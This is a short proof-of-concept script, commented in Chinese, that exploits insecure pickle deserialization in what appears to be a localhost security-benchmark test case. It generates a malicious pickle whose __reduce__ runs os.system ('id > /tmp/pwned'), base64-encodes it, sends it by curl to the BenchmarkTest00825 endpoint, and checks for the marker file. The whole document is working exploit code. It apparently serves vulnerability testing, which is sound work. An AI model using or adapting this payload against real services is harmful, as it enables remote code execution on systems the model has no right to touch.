# 1. 生成恶意 pickle payload：
python3 -c "
import pickle, base64
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id > /tmp/pwned',))
print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode())
"

# 2. 发送请求触发 RCE（payload 替换为你生成的）：
curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00825?BenchmarkTest00825=<payload>'

# 3. 验证命令已执行：
cat /tmp/pwned